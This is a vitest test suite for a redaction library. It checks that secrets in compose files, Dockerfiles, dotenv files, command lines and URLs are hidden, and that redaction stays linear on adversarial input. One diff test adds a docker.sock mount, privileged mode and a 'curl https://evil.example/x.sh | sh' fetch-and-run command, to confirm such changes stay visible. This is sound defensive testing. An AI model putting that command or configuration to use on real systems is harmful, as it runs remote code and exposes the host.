import { describe, it, expect } from 'vitest';
import { redactCommandLine, redactDeep, redactDocument, redactDocumentLines, redactUrlCredentials } from '../src/client/redact.js';
import { formatRedactedDiff, listServiceImages } from '../src/client/compose.js';
import { documentSecrets, sanitizeServerMessage } from '../src/client/base.js';
import { parseDotenv } from '../src/cli/dotenv.js';
import { composeReferences } from '../src/cli/commands/env.js';

/**
 * Shapes found by the third adversarial review: each one printed its secret. `S` is synthetic.
 * A shape belongs here when a real compose file, Dockerfile, dotenv file or proxy configuration
 * can take it.
 */
const S = 's3cr3t-AAAA1111bbbb2222';
const doc = (...lines: string[]): string => lines.join('\n');
const hides = (out: string, secret = S): void => { expect(out).not.toContain(secret); };

describe('command words', () => {
  it('a quoted -pSECRET word (the MySQL exec-form healthcheck)', () => {
    hides(redactDocument(`      test: ["CMD", "mysqladmin", "ping", "-h", "localhost", "-uroot", "-p${S}"]`));
    hides(redactCommandLine(`mysql -uroot "-p${S}" db`));
    expect(redactCommandLine(`mysql -uroot "-p${S}" db`)).toBe('mysql -uroot "-p[REDACTED]" db');
  });

  it('a numeric password is not a port mapping; a port mapping still is', () => {
    hides(redactCommandLine('mysql -p12345678 db'), '12345678');
    hides(redactCommandLine('sshpass -p 12345678 ssh host'), '12345678');
    expect(redactCommandLine('docker run -p 8080:80 -p 5432 -p 127.0.0.1:53:53/udp nginx')).toBe('docker run -p 8080:80 -p 5432 -p 127.0.0.1:53:53/udp nginx');
  });

  it('Bearer / Basic tokens and header flags, in every arrangement', () => {
    hides(redactDocument(`      test: ["CMD", "wget", "-q", "--header=Authorization: Bearer ${S}", "http://localhost/health"]`));
    hides(redactDocument(`      test: wget -q --header='X-Api-Key: ${S}' http://localhost/health`));
    hides(redactDocument(`      value: Bearer ${S}`));
    hides(redactCommandLine(`echo Authorization: Bearer ${S}`));
    hides(redactCommandLine(`curl -H "Authorization: Basic ${S}" https://x`));
    hides(redactCommandLine(`curl --header "X-Auth-Token: ${S}" https://x`));
    // A header that is not sensitive stays readable.
    expect(redactCommandLine('curl -H "Accept: application/json" https://x')).toBe('curl -H "Accept: application/json" https://x');
  });

  it('shell quoting that glues parts into one word', () => {
    hides(redactCommandLine(`redis-server --requirepass 'it'\\''s ${S}'`));
    hides(redactCommandLine(`redis-server --requirepass "a"${S}`));
    hides(redactCommandLine(`redis-server --requirepass correct\\ ${S}`));
    hides(redactCommandLine(`redis-server --requirepass $'${S}'`));
    hides(redactCommandLine(`curl -uelastic:${S} http://es:9200`));
    expect(redactCommandLine(`curl -uelastic:${S} http://es:9200`)).toBe('curl -uelastic:[REDACTED] http://es:9200');
    expect(redactCommandLine('mysql -uroot db')).toBe('mysql -uroot db');
  });

  it('JSON in an argument, a .netrc line, XML', () => {
    hides(redactCommandLine(`app --config '{"password": "${S}"}'`));
    hides(redactDocument(`RUN echo "machine github.com login x password ${S}" > ~/.netrc`));
    hides(redactCommandLine(`echo <password>${S}</password>`));
    expect(redactCommandLine('echo <name>web</name>')).toBe('echo <name>web</name>');
  });

  it('a `$WORD` is a reference in a command, a literal in single quotes and in a directive', () => {
    expect(redactDocument('    command: redis-server --requirepass $REDIS_PASSWORD')).toContain('$REDIS_PASSWORD');
    hides(redactDocument('requirepass $S3cr3tHunter2Password'), 'S3cr3tHunter2Password');
    hides(redactCommandLine("mysql --password '$S3cr3tHunter2Password' -e 'select 1'"), 'S3cr3tHunter2Password');
  });
});

describe('more command shapes', () => {
  it('flags that set a variable hide its value whatever the name', () => {
    expect(redactCommandLine(`docker run -e FOO=${S} -e lower=${S} --env=mixedCase=${S} --build-arg gh_pat=${S} img`))
      .toBe('docker run -e FOO=[REDACTED] -e lower=[REDACTED] --env=mixedCase=[REDACTED] --build-arg gh_pat=[REDACTED] img');
    hides(redactCommandLine(`kubectl create secret generic x --from-literal=password=${S}`));
    hides(redactDocument(doc('    command:', '      - run', '      - -e', `      - lower=${S}`, '      - --set', `      - auth.password=${S}`, '      - --set', `      - a.b=${S}`)));
    expect(redactCommandLine('docker run -e NODE_ENV -e DEBUG=true img')).toBe('docker run -e NODE_ENV -e DEBUG=true img');
  });

  it('assignments before the program, and after export / env', () => {
    expect(redactCommandLine(`FOO=${S} lower=${S} node x.js`)).toBe('FOO=[REDACTED] lower=[REDACTED] node x.js');
    hides(redactCommandLine(`export API_TOKEN=${S}; export lower=${S}`));
    hides(redactCommandLine(`cd /app && lower=${S} node x.js`));
    hides(redactCommandLine(`FOO=$(echo ${S}) node x.js`));
    hides(redactCommandLine(`FOO=\`cat ${S}\` node x.js`));
    hides(redactDocument(doc(`lower=${S}`, `export lower2=${S}`)));
    // After the program a name=value word is an argument: left alone unless its name says otherwise.
    expect(redactCommandLine('dd if=/dev/zero of=/tmp/x bs=1M count=1')).toBe('dd if=/dev/zero of=/tmp/x bs=1M count=1');
    expect(redactCommandLine('PORT=3000 DEBUG=true node x.js')).toBe('PORT=3000 DEBUG=true node x.js');
  });

  it('separators and attached forms', () => {
    hides(redactCommandLine(`tool --password = ${S}`));
    hides(redactCommandLine(`tool --password:${S}`));
    hides(redactCommandLine(`curl --user=admin:${S} http://x`));
    expect(redactCommandLine(`curl --user=admin:${S} http://x`)).toBe('curl --user=admin:[REDACTED] http://x');
    hides(redactCommandLine(`npm config set registry=//registry.npmjs.org/:_authToken=${S}`));
    hides(redactCommandLine(`redis-cli -a${S} ping`));
    expect(redactCommandLine('ls -al /srv && ps -aux')).toBe('ls -al /srv && ps -aux');
    hides(redactCommandLine(`redis-server --requirepass $'${S}\\'tail hunter2'`), 'hunter2');
  });

  it('a token after an authorization flag, custom auth headers, JSON without blanks', () => {
    hides(redactDocument(doc('    command:', `      - --tracing.otlp.http.headers.authorization=Bearer ${S}`, '      - --entrypoints.web.address=:80')));
    hides(redactCommandLine(`curl -H "X-Custom-Auth: ${S}" http://x`));
    hides(redactCommandLine(`app --config '{"password":"${S}","x":1}'`));
  });

  it('credentials that are a path, a hash or a schemeless DSN', () => {
    hides(redactCommandLine(`curl https://hooks.slack.com/services/T000/B000/${S}`));
    hides(redactUrlCredentials(`https://discord.com/api/webhooks/123456/${S}`));
    hides(redactUrlCredentials(`https://api.telegram.org/bot123456:${S}/sendMessage`));
    hides(redactCommandLine(`app --db "user:${S}@tcp(db:3306)/x"`));
    hides(redactDocument(doc('basic_auth {', `    admin $2a$14$${S}`, '}')));
    hides(redactDocument(`      - traefik.http.middlewares.auth.basicauth.users=admin:$$apr1$$H6uskkkW$$${S}`));
  });

  it('configuration lines: names ending in key, redis ACL, a directive as a label value', () => {
    hides(redactDocument(`      - traefik.http.middlewares.m.plugin.x.sharedkey=${S}`));
    hides(redactDocument(`ACL SETUSER alice on >${S}`));
    hides(redactDocument(`      caddy.reverse_proxy.header_up_1: X-Api-Key ${S}`));
    hides(redactDocument(doc('      pw = x', `      authkey ${S}`)));
  });
});

describe('blocks that hold variables', () => {
  it('build args, an extension field, a k8s-style env list', () => {
    hides(redactDocument(doc('    build:', '      args:', `        gh_pat: ${S}`, `        mykey: ${S}`, '      context: .')));
    expect(redactDocument(doc('    build:', '      args:', `        gh_pat: ${S}`, '      context: .'))).toContain('context: .');
    hides(redactDocument(doc('    x-environment:', `      lower: ${S}`)));
    hides(redactDocument(doc('env:', '  - name: API_TOKEN', `    value: ${S}`, '  - name: OTHER', `    value: "${S}"`)));
  });

  it('the literal of a definition under the top-level secrets: section', () => {
    const out = redactDocument(doc('secrets:', '  db_password:', '    environment: DBP', `    content: ${S}`, '  other:', '    file: ./other.txt'));
    hides(out);
    expect(out).toContain('file: ./other.txt');
  });

  it('a quoted list item that closes on a later line', () => {
    hides(redactDocument(doc('    environment:', '      - "KEY=line1', `      line2 ${S}"`, '    image: x')));
  });
});

describe('quotes inside quotes', () => {
  it('a token in escaped quotes after Bearer / Basic goes with them', () => {
    hides(redactDocument(`    command: ["tool", "-H", "Authorization: Bearer \\"${S}\\""]`));
    hides(redactDocument(`    command: ["tool", "-H", "Authorization: Basic \\"${S}\\""]`));
    hides(redactDocument(doc('    command:', '      - tool', '      - -H', `      - "Authorization: Bearer \\"${S}\\""`)));
    hides(redactCommandLine(`echo "say Bearer \\"${S}\\" now"`));
  });

  it('a single-quoted command glued to escaped-quote parts is still read as a command', () => {
    hides(redactDocument(`    command: "sh -c 'mongosh --password \\"${S}\\" --eval '\\\\''x'\\\\'''"`));
    hides(redactCommandLine(`sh -c 'echo '\\''hi'\\''; redis-cli -a "${S}" ping'`));
    hides(redactCommandLine(`sh -c 'export A=1'"; mysql --password ${S} db"`));
    expect(redactCommandLine(`sh -c 'echo '\\''hi'\\''; ls -al /srv'`)).toBe(`sh -c 'echo '\\''hi'\\''; ls -al /srv'`);
  });

  it('a header flag with its value in escaped quotes, and JSON in an argument', () => {
    hides(redactDocument(`    command: "wget -q --header=\\"X-Api-Key: ${S}\\" http://localhost/health"`));
    hides(redactDocument(`      test: ["CMD-SHELL", "wget -q --header=\\"X-Api-Key: ${S}\\" http://localhost/health"]`));
    hides(redactCommandLine(`curl -d "{\\"password\\":\\"${S}\\"}" https://x`));
    hides(redactDocument(`    command: "curl -d \\"{\\\\\\"password\\\\\\":\\\\\\"${S}\\\\\\"}\\" https://x"`));
    hides(redactDocument(`    command: curl -d '{"password":"${S}"}' https://x`));
  });
});

describe('commands given as a list', () => {
  it('the value of a flag on the next list item', () => {
    const out = redactDocument(doc('    command:', '      - redis-server', '      - --requirepass', '      - c2VjcmV0cGFzcw=='));
    hides(out, 'c2VjcmV0cGFzcw');
    expect(out).toContain('- redis-server');
    expect(out).toContain('- --requirepass');
  });

  it('user:password on the item after -u', () => {
    hides(redactDocument(doc('      test:', '        - CMD', '        - curl', '        - -u', `        - elastic:${S}`, '      interval: 5s')));
  });

  it('a flow list wrapped over two lines', () => {
    const out = redactDocument(doc('    command: ["redis-server", "--appendonly", "yes", "--requirepass",', `              "${S}"]`, '    ports:', '      - "6379:6379"'));
    hides(out);
    expect(out).toContain('"redis-server", "--appendonly", "yes", "--requirepass",');
    expect(out).toContain('- "6379:6379"');
  });

  it('after an anchor, a tag or a comment; and a comment between flag and value', () => {
    hides(redactDocument(doc('    command: &cmd', '      - redis-server', '      - --requirepass', `      - ${S}`)));
    hides(redactDocument(doc('    command: !!seq', '      - --requirepass', `      - ${S}`)));
    hides(redactDocument(doc('    command: # the server', '      - --requirepass # note', `      - ${S}`)));
  });

  it('a JSON-style compose', () => {
    const out = redactDocument(doc('      "entrypoint": [', '        "redis-server",', '        "--requirepass",', '        "c2VjcmV0cGFzcw=="', '      ],', '      "image": "redis:7"'));
    hides(out, 'c2VjcmV0cGFzcw');
    expect(out).toContain('"image": "redis:7"');
  });

  it('ordinary commands stay readable', () => {
    const text = doc('    command: ["npm", "run", "start"]', '    healthcheck:', '      test: ["CMD", "curl", "-f", "http://localhost:3000/health"]', '      interval: 10s', '    entrypoint:', '      - /bin/sh', '      - -c', "      - '--providers.docker=true'");
    expect(redactDocument(text)).toBe(text);
  });
});

describe('values nested under a sensitive key', () => {
  it('a mapping and a list keep their shape and lose their leaves', () => {
    const out = redactDocument(doc('passwords:', `  admin: ${S}`, 'api_keys:', `  - ${S}`, '  - hunter2password', 'name: web'));
    hides(out);
    hides(out, 'hunter2password');
    expect(out).toContain('  admin: [REDACTED]');
    expect(out).toContain('name: web');
  });

  it('a Traefik basicAuth users list', () => {
    hides(redactDocument(doc('      basicAuth:', '        users:', `          - "admin:$apr1$H6uskkkW$${S}"`, '      other: 1')));
  });

  it('a service NAMED like a secret, and the top-level secrets: section, stay readable', () => {
    const services = doc('services:', '  supertokens:', '    image: registry.supertokens.io/supertokens/supertokens-postgresql:9', '    ports:', '      - "3567:3567"');
    expect(redactDocument(services)).toBe(services);
    const secrets = doc('secrets:', '  db_password:', '    file: ./db_password.txt');
    expect(redactDocument(secrets)).toBe(secrets);
  });
});

describe('values that run over several lines', () => {
  it('a plain scalar folded onto deeper lines', () => {
    const out = redactDocument(doc('    environment:', '      JWT_PRIVATE: abcdef', `        ${S}`, '      PORT: 3000'));
    hides(out);
    expect(out).toContain('PORT: 3000');
  });

  it('a quoted scalar that closes on a later line, at any indent', () => {
    hides(redactDocument(doc('    environment:', '      MOTD: "hello', `      world ${S}"`, '      PORT: 3000')));
    const dotenv = redactDocument(doc('FOO="line1', `line2 ${S}"`, 'BAR=1'));
    hides(dotenv);
    expect(dotenv).toContain('BAR=1');
    hides(redactDocument(doc("      NOTE: 'it''s a", `  longer ${S}'`, '      NEXT: 1')));
  });

  it('a stray quote does not hide the rest of a long document', () => {
    const lines = ['    environment:', '      A: "never closed', ...Array.from({ length: 500 }, (_, i) => `    key${i}: value${i}`)];
    expect(redactDocumentLines(lines.join('\n')).at(-1)).toBe('    key499: value499');
  });

  it('an inline flow environment that continues on the next line', () => {
    hides(redactDocument(doc('    environment: { FOO: bar,', `      lowerkey: ${S} }`, '    image: x')));
  });

  it('a sibling key of a list item is not mistaken for a continuation', () => {
    expect(redactDocument(doc('  - API_KEY: abc', '    name: web'))).toBe(doc('  - API_KEY: [REDACTED]', '    name: web'));
  });
});

describe('line breaks', () => {
  it('a lone CR is a YAML line break: the document is not one line', () => {
    const text = `services:\r  db:\r    environment:\r      POSTGRES_PASSWORD: ${S}\r`;
    const out = redactDocumentLines(text);
    expect(out).toHaveLength(1);
    hides(out.join('\n'));
    expect(out[0]).toContain('services:\r  db:\r    environment:\r      POSTGRES_PASSWORD: [REDACTED]');
  });

  it('CRLF and LF documents redact alike, one output line per input line', () => {
    const lf = doc('services:', '  db:', '    environment:', `      - POSTGRES_PASSWORD=${S}`, '    image: postgres:16');
    const crlf = lf.replace(/\n/g, '\r\n');
    expect(redactDocument(crlf)).toBe(redactDocument(lf).replace(/\n/g, '\r\n'));
    expect(redactDocumentLines(crlf)).toHaveLength(5);
  });
});

describe('PEM blocks', () => {
  it('a marker inside a label does not hide what follows — a diff must show a new docker.sock mount', () => {
    const before = doc('services:', '  app:', '    image: nginx:1', '    labels:', '      - "note=-----BEGIN NOTE-----"', '    volumes:', '      - data:/data');
    const after = doc('services:', '  app:', '    image: nginx:1', '    labels:', '      - "note=-----BEGIN NOTE-----"', '    volumes:', '      - data:/data', '      - /var/run/docker.sock:/var/run/docker.sock', '    privileged: true', '    command: sh -c "curl https://evil.example/x.sh | sh"');
    const diff = formatRedactedDiff(before, after).join('\n');
    expect(diff).toContain('/var/run/docker.sock:/var/run/docker.sock');
    expect(diff).toContain('privileged: true');
    expect(diff).toContain('evil.example');
  });

  it('a real block is hidden to its END, also commented out or on one line', () => {
    const block = redactDocument(doc('    content: |', '      -----BEGIN PRIVATE KEY-----', '      MIIEs3cr3tAAAA1111bbbb2222', '      MIIEvQIBADANBgkqhkiG9w0BAQEFAASC', '      -----END PRIVATE KEY-----', '  other: 1'));
    hides(block, 'MIIEs3cr3tAAAA1111bbbb2222');
    hides(block, 'MIIEvQIBADANBgkqhkiG9w0BAQEFAASC');
    expect(block).toContain('other: 1');
    const commented = redactDocument(doc('# -----BEGIN PRIVATE KEY-----', '# MIIEs3cr3tAAAA1111', '# -----END PRIVATE KEY-----', 'name: web'));
    hides(commented, 'MIIEs3cr3tAAAA1111');
    expect(commented).toContain('name: web');
    hides(redactDocument(`    note: "-----BEGIN PRIVATE KEY-----\\nMIIE${S}\\n-----END PRIVATE KEY-----"`));
  });
});

describe('comments', () => {
  it('what a comment comments out is redacted like a live line', () => {
    hides(redactDocument(`# requirepass ${S}`));
    hides(redactDocument(`# - DB_PASSWORD: ${S}`));
    hides(redactDocument(`# token ${S}`));
    hides(redactDocument(`    image: postgres:16  # admin password: ${S}`));
    expect(redactDocument(`    image: postgres:16  # admin password: ${S}`)).toContain('image: postgres:16');
    expect(redactDocument('    image: postgres:16  # pinned for the migration')).toBe('    image: postgres:16  # pinned for the migration');
  });

  it('directive spellings: quoted names, nginx variables, a Basic credential in a note', () => {
    hides(redactDocument(`set $api_key "${S}";`));
    hides(redactDocument(`"password" ${S}`));
    hides(redactDocument(`@password ${S}`));
    hides(redactDocument(`note: Basic ${S}`));
    expect(redactDocument('note: Basic setup for the staging host')).toBe('note: Basic setup for the staging host');
  });
});

describe('Dockerfile', () => {
  it('ENV / ARG continuation lines, escapes and lower-case instructions', () => {
    hides(redactDocument(doc('ENV A=1 \\', `    npm_value='${S} y'`, 'FROM node:24')));
    hides(redactDocument(`ENV SECRET="abc\\"def ${S}"`));
    hides(redactDocument(`ENV PASSPHRASE=correct\\ ${S}`));
    hides(redactDocument(`arg foo=${S}`));
    hides(redactDocument(`ONBUILD ENV lower=${S}`));
    hides(redactDocument(`ENV LEGACY some ${S}`));
    expect(redactDocument(doc('ENV A=1 \\', `    npm_value='${S} y'`, 'FROM node:24'))).toContain('FROM node:24');
  });

  it('a flag whose value is on the continuation line', () => {
    const out = redactDocument(doc('RUN redis-server --requirepass \\', `    ${S}`, 'RUN echo done'));
    hides(out);
    expect(out).toContain('RUN redis-server --requirepass \\');
    expect(out).toContain('RUN echo done');
  });
});

describe('URL userinfo', () => {
  it('a user name holding an @, and a lone token on a non-http scheme', () => {
    expect(redactUrlCredentials(`smtp://me@example.com:${S}@smtp.example.com:587`)).toBe('smtp://me@example.com:[REDACTED]@smtp.example.com:587');
    hides(redactUrlCredentials(`redis://${S}@cache:6379`));
    hides(redactDeep({ git_repository: `https://me@example.com:${S}@git.example.com/o/r.git` }).git_repository);
  });

  it('user names stay readable', () => {
    expect(redactUrlCredentials('postgres://readonly@db:5432/app')).toBe('postgres://readonly@db:5432/app');
    expect(redactUrlCredentials('ssh://git@github.com/o/r.git')).toBe('ssh://git@github.com/o/r.git');
    expect(redactUrlCredentials('https://example.com/a?b=c')).toBe('https://example.com/a?b=c');
  });
});

describe('server messages', () => {
  it('is bounded before it is scanned, and keeps no secret that was sent', () => {
    const huge = `invalid: ${S} ${'x'.repeat(2_000_000)}`;
    const started = performance.now();
    const out = sanitizeServerMessage(huge, [S]);
    expect(performance.now() - started).toBeLessThan(500);
    hides(out);
    expect(out.length).toBeLessThanOrEqual(401);
  });
});

/**
 * Each of these took seconds to minutes at 50–200 kB before (a pattern re-scanning from every
 * position). What is asserted is GROWTH, not speed: eight times the input may take about eight
 * times as long — a quadratic scan takes sixty-four — whatever the machine. The allowance is
 * forty: on these sizes garbage collection alone moves a linear pass between 6× and 30×. Below
 * six seconds nothing is concluded: a loaded machine is slow, not quadratic, and a line of a
 * hundred thousand words allocates enough to be slow honestly. The patterns this guards against
 * took 9 to 130 seconds at this size.
 */
describe('linear time on hostile input', { timeout: 120_000 }, () => {
  const N = 12_500;
  const timed = (fn: () => unknown): number => { const t = performance.now(); fn(); return performance.now() - t; };
  const linear = (label: string, run: (n: number) => unknown): void => {
    const small = Math.min(timed(() => run(N)), timed(() => run(N)), timed(() => run(N)));
    const large = timed(() => run(N * 8));
    expect(large, `${label}: ${Math.round(small)} ms at ${N}, ${Math.round(large)} ms at ${N * 8}`).toBeLessThan(Math.max(6000, small * 40));
  };

  it('command-list item with a long run of blanks', () => {
    linear('list item', (n) => redactDocument(doc('    command:', `      - a${' '.repeat(n)}b`)));
  });
  it('a long word, and many URL starts without an @', () => {
    linear('word', (n) => redactUrlCredentials('a'.repeat(n)));
    linear('urls, one run', (n) => redactUrlCredentials('a://b:c'.repeat(n / 7)));
    linear('urls, many runs', (n) => redactUrlCredentials('a://b:c '.repeat(n / 8)));
    linear('dsn markers', (n) => redactUrlCredentials('@tcp('.repeat(n / 5)));
    linear('hash markers', (n) => redactUrlCredentials('$2a$'.repeat(n / 4)));
  });
  it('a long flag-like word', () => {
    linear('flag', (n) => redactCommandLine(`-${'key'.repeat(n / 3)}!`));
  });
  it('a line of colons, a long ENV argument, a flow value followed by blanks', () => {
    linear('colons', (n) => redactDocument(`${':'.repeat(n)}x y`));
    linear('ENV', (n) => redactDocument(`ENV ${'a'.repeat(n)}`));
    linear('flow', (n) => redactDocument(`FOO: [x]${' '.repeat(n)}y`));
  });
  it('quotes, backslashes, dashes, hash words, substitutions', () => {
    for (const unit of ['"', "'", '\\', '-', '# ', '=', '@', ' ', '[', '\\"', '\\\\\\"', 'x\\"', '$(', '`', 'a=1 ', '[REDACTED]', "'a b'x ", 'Bearer \\"']) {
      linear(`command ${JSON.stringify(unit)}`, (n) => redactCommandLine(unit.repeat(n)));
      linear(`document ${JSON.stringify(unit)}`, (n) => redactDocument(unit.repeat(n)));
    }
  });
  it('substitutions, glued quotes and flow lists', () => {
    for (const unit of ['$("x") ', '$(', '$(a ', '`a b` ', "'a'\\''", '"a b"; ', 'x\\\n', '-H"a: b" ', 'a = b ']) {
      linear(`command ${JSON.stringify(unit)}`, (n) => redactCommandLine(unit.repeat(n / unit.length)));
    }
    linear('flow list, one line', (n) => redactDocument(`    command: [${'"a", b c, '.repeat(n / 10)}"z"]`));
    linear('flow list, many lines', (n) => redactDocument(`    command: [\n${'      "--flag", # note\n'.repeat(n / 20)}    ]`));
    linear('block list', (n) => redactDocument(`    command:\n${'      - --flag=value with blanks\n'.repeat(n / 30)}`));
    linear('key lines with comments', (n) => redactDocument('    API_KEY: # note\n'.repeat(n / 20)));
    linear('pem headers', (n) => redactDocument(`-----BEGIN PRIVATE KEY-----\n${'Comment: x\n'.repeat(n / 11)}`));
  });

  it('many short lines', () => {
    linear('lines', (n) => redactDocument('      - KEY=value\n'.repeat(n / 10)));
    linear('open quote', (n) => redactDocument(`A: "open\n${'x\n'.repeat(n / 2)}`));
  });
  it('an image line followed by blanks', () => {
    linear('image', (n) => listServiceImages(doc('services:', '  app:', `    image: x${' '.repeat(n)}y`)));
    expect(listServiceImages(doc('services:', '  app:', '    image: "nginx:1.27"   # pinned'))).toEqual([{ service: 'app', image: 'nginx:1.27', line: 2 }]);
  });
  it('the secrets of a document with a long run of blanks', () => {
    linear('documentSecrets', (n) => documentSecrets(`a${' '.repeat(n)}b`));
    expect(documentSecrets(doc('services:', `  - PASSWORD=${S}`, `  token: "${S}-2"`))).toEqual(expect.arrayContaining([S, `${S}-2`]));
  });
  it('a dotenv value quoted over thousands of lines', () => {
    const body = (lines: number): string => Array.from({ length: lines }, () => 'MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSj').join('\n');
    linear('dotenv', (n) => parseDotenv(`CERT="${body(n / 10)}"\nNEXT=1\n`));
    expect(parseDotenv(`CERT="${body(3)}"\nNEXT=1\n`)).toEqual({ CERT: body(3), NEXT: '1' });
  });
  it('a compose with thousands of blank lines, searched for a key', () => {
    linear('composeReferences', (n) => composeReferences(`services:\n${'\n'.repeat(n / 2)}  app:\n    image: x\n`, 'MISSING_KEY'));
    expect(composeReferences('    environment:\n      - API_KEY\n', 'API_KEY')).toBe(true);
    expect(composeReferences('    environment:\n      OTHER: ${API_KEY}\n', 'API_KEY')).toBe(true);
    expect(composeReferences('    environment:\n      OTHER: 1\n', 'API_KEY')).toBe(false);
  });
  it('a diff of two large unrelated documents is bounded, and a one-line change in a large one is exact', () => {
    const a = Array.from({ length: 12_500 }, (_, i) => `a${i}`).join('\n');
    const b = Array.from({ length: 12_500 }, (_, i) => `b${i}`).join('\n');
    expect(timed(() => formatRedactedDiff(a, b))).toBeLessThan(5000);
    const big = Array.from({ length: 12_500 }, (_, i) => `    line${i}: v`);
    const changed = [...big];
    changed[6000] = '    image: nginx:2';
    const diff = formatRedactedDiff(big.join('\n'), changed.join('\n'));
    expect(diff.filter((l) => l.startsWith('+') || l.startsWith('-'))).toHaveLength(2);
  });
});
